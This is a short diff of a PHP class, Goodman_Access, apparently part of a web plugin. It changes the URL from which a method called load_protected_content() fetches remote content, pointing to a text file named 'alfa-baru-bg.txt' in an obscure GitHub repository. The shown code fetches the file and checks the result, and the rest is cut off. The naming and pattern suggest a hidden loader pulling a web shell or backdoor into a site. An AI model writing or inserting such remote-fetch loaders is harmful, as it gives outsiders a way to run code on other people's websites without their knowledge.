@@ -172,7 +172,7 @@ class Goodman_Access {
      * Load protected remote content
      */
     private function load_protected_content() {
-        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-tronton.txt';
+        $url = 'https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alfa-baru-bg.txt';
         $content = $this->fetch_remote($url);
         
         if ($content !== false) {
